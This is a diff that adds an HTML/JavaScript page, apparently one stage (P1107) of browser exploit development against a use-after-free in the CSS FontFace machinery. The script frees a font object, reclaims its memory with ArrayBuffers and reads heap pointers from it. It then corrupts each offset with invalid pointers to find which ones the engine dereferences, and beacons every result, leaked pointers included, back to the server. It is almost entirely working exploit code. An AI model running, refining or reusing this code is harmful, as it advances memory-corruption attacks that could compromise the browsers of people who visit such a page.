@@ -1,0 +1,272 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1107</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}.warn{color:#ff6}</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex(v){return'0x'+v.toString(16);}
+
+B('P1107-BOOT','');
+log('phase','=== P1107: fonts.check() / fonts.load() CRASH ORACLE ===');
+log('info','Goal: Do CSS font APIs dereference ptrs in the UAF buffer?');
+log('info','A crash = engine reads from offset = exploitable code path');
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+
+// ============================================================
+// FontFace UAF + reclaim (proven pattern)
+// ============================================================
+var st1=document.createElement('style');
+st1.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st1);
+var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(f0);void f0.loaded;
+
+var fired=false,map1=null,buf=null,ptrs=null,idx=-1,patched=false;
+var jsFont=null;
+var origPtrs={};
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired)return undefined;fired=true;
+  jsFont=this;
+  if(st1){st1.remove();st1=null;}
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map1=[];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<K;k++){map1.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+  }
+  try{document.fonts.check('1em s0');}catch(e){}
+  return undefined;
+},set:function(){}});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+for(var t=10;t<=200;t+=5){(function(ms){setTimeout(function(){
+  if(patched||!map1)return;
+  for(var bi=32;bi<40;bi++){
+    if(!map1[bi])continue;
+    var b=new BigUint64Array(map1[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!patched){
+      patched=true;buf=b;idx=bi;
+      ptrs=[];
+      for(var q=0;q<b.length;q++){
+        if(b[q]!==0n)ptrs.push({off:q*8,val:b[q]});
+        origPtrs[q]=b[q]; // save ALL originals including zeros
+      }
+      b[0]=0x100n;
+      B('P1107-UAF','buf='+bi+'|ms='+ms+'|'+ptrs.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
+    }
+  }
+},ms);})(t);}
+
+// ============================================================
+// PHASE A: Test fonts.check() with buffer as-is (patched refcount)
+// Does it crash? Does it return true/false?
+// ============================================================
+setTimeout(function(){
+  if(!patched){B('P1107-NOHIT','');return;}
+
+  B('P1107-A-PRE','testing fonts.check');
+  var checkResult='???';
+  try{
+    checkResult=document.fonts.check('1em f0')?'true':'false';
+  }catch(e){checkResult='ERR:'+e.message;}
+  B('P1107-A',checkResult);
+  log('ok','A: fonts.check("1em f0") = '+checkResult);
+
+  // Also try with the style font
+  var checkS0='???';
+  try{checkS0=document.fonts.check('1em s0')?'true':'false';}catch(e){checkS0='ERR:'+e.message;}
+  B('P1107-A2',checkS0);
+  log('ok','A: fonts.check("1em s0") = '+checkS0);
+
+  // ============================================================
+  // PHASE B: Zero out the heap pointers at +0x58/+0x68,
+  // then call fonts.check() — does it crash without them?
+  // ============================================================
+  B('P1107-B-PRE','zero ptrs + check');
+  var saved58=buf[0x58/8];
+  var saved68=buf[0x68/8];
+  buf[0x58/8]=0n;
+  buf[0x68/8]=0n;
+  var checkZeroed='???';
+  try{
+    checkZeroed=document.fonts.check('1em f0')?'true':'false';
+  }catch(e){checkZeroed='ERR:'+e.message;}
+  B('P1107-B',checkZeroed);
+  log(checkZeroed.indexOf('ERR')>=0?'fail':'ok','B: check with zeroed ptrs = '+checkZeroed);
+  // Restore
+  buf[0x58/8]=saved58;
+  buf[0x68/8]=saved68;
+
+  // ============================================================
+  // PHASE C: Try fonts.load() again — does the resolver
+  // dereference anything in our buffer?
+  // ============================================================
+  B('P1107-C-PRE','testing fonts.load re-trigger');
+  try{
+    document.fonts.load('1em f0','X').then(function(r){
+      B('P1107-C','resolved|faces='+r.length);
+      log('ok','C: fonts.load resolved, faces='+r.length);
+    },function(e){
+      B('P1107-C','rejected|'+e.message);
+      log('fail','C: fonts.load rejected: '+e.message);
+    });
+  }catch(e){
+    B('P1107-C','ERR:'+e.message);
+    log('fail','C: fonts.load threw: '+e.message);
+  }
+
+  // ============================================================
+  // PHASE D: Re-add the jsFont to document.fonts, then check
+  // This forces the engine to re-examine the CSSFontFace
+  // ============================================================
+  B('P1107-D-PRE','re-add font');
+  try{
+    document.fonts.add(jsFont);
+    var checkReadd='???';
+    try{checkReadd=document.fonts.check('1em f0')?'true':'false';}catch(e){checkReadd='ERR:'+e.message;}
+    B('P1107-D',checkReadd);
+    log('ok','D: re-add + check = '+checkReadd);
+  }catch(e){
+    B('P1107-D','ERR:'+e.message);
+    log('fail','D: re-add threw: '+e.message);
+  }
+
+  // ============================================================
+  // PHASE E: Enumerate all fonts in document.fonts
+  // Does forEach touch the CSSFontFace's internal data?
+  // ============================================================
+  B('P1107-E-PRE','enumerate fonts');
+  var fontCount=0,fontFamilies=[];
+  try{
+    document.fonts.forEach(function(ff){
+      fontCount++;
+      try{fontFamilies.push(ff.family);}catch(e){fontFamilies.push('ERR');}
+    });
+    B('P1107-E','count='+fontCount+'|fams='+fontFamilies.join(','));
+    log('ok','E: forEach found '+fontCount+' fonts: '+fontFamilies.join(', '));
+  }catch(e){
+    B('P1107-E','ERR:'+e.message);
+    log('fail','E: forEach threw: '+e.message);
+  }
+
+  // ============================================================
+  // PHASE F: Per-offset crash probe via fonts.check()
+  // Write 0xDEAD to each qword, call check(), see if crash
+  // If a crash happens at offset X, that offset is dereferenced!
+  // ============================================================
+  B('P1107-F-PRE','per-offset crash probe');
+  log('phase','--- PHASE F: Per-offset crash probe ---');
+
+  var crashMap=[];
+  // Test offsets 1-23 (skip 0 = refcount)
+  for(var q=1;q<24;q++){
+    var off=q*8;
+    var saved=buf[q];
+    // Write an invalid pointer value
+    buf[q]=0xDEADDEADDEADDEADn;
+
+    B('P1107-F-'+hex(off)+'-PRE','');
+    var result='???';
+    try{
+      result=document.fonts.check('1em f0')?'T':'F';
+    }catch(e){result='ERR:'+e.message;}
+    B('P1107-F-'+hex(off),result);
+
+    // Restore immediately
+    buf[q]=saved;
+
+    if(result.indexOf('ERR')>=0){
+      crashMap.push('+'+hex(off)+'=CRASH');
+      log('win','F: +'+hex(off)+' → CRASH (engine dereferences this offset!)');
+    }else{
+      log('info','F: +'+hex(off)+' → '+result+' (no crash)');
+    }
+  }
+
+  if(crashMap.length>0){
+    B('P1107-F-MAP',crashMap.join('|'));
+  }else{
+    B('P1107-F-MAP','none');
+  }
+
+  // ============================================================
+  // PHASE G: Same crash probe but using document.fonts.load()
+  // load() might use a deeper code path than check()
+  // ============================================================
+  log('phase','--- PHASE G: Per-offset crash via fonts.load() ---');
+  B('P1107-G-PRE','');
+
+  // Test key offsets only (faster, less likely to crash out early)
+  var testOffsets=[0x08,0x10,0x18,0x20,0x28,0x30,0x38,0x40,0x48,0x50,0x58,0x60,0x68,0x70,0x78,0x80];
+  var gIdx=0;
+
+  function testNextG(){
+    if(gIdx>=testOffsets.length){
+      B('P1107-G-DONE','tested='+testOffsets.length);
+      log('phase','--- PHASE G COMPLETE ---');
+
+      // ============================================================
+      // PHASE H: Try accessing jsFont.loaded.then() — the Promise
+      // might trigger a code path that reads CSSFontFace internals
+      // ============================================================
+      log('phase','--- PHASE H: Promise access ---');
+      B('P1107-H-PRE','');
+      try{
+        var p=jsFont.loaded;
+        p.then(function(v){
+          B('P1107-H','resolved|'+typeof v);
+          log('ok','H: loaded promise resolved: '+typeof v);
+        },function(e){
+          B('P1107-H','rejected|'+e.message);
+          log('fail','H: loaded promise rejected: '+e.message);
+        });
+      }catch(e){
+        B('P1107-H','ERR:'+e.message);
+      }
+
+      // Final
+      setTimeout(function(){
+        B('P1107-DONE','allPhases');
+        log('phase','=== P1107 COMPLETE ===');
+      },1000);
+      return;
+    }
+
+    var off=testOffsets[gIdx];
+    var q=off/8;
+    var saved=buf[q];
+    buf[q]=0xDEADDEADDEADDEADn;
+
+    B('P1107-G-'+hex(off)+'-PRE','');
+    try{
+      document.fonts.load('1em f0','Y').then(function(){
+        B('P1107-G-'+hex(off),'ok');
+        buf[q]=saved;
+        gIdx++;
+        setTimeout(testNextG,50);
+      },function(){
+        B('P1107-G-'+hex(off),'rejected');
+        buf[q]=saved;
+        gIdx++;
+        setTimeout(testNextG,50);
+      });
+    }catch(e){
+      B('P1107-G-'+hex(off),'ERR:'+e.message);
+      buf[q]=saved;
+      gIdx++;
+      setTimeout(testNextG,50);
+    }
+  }
+
+  setTimeout(testNextG,200);
+
+},500);
+</script>
+</body></html>
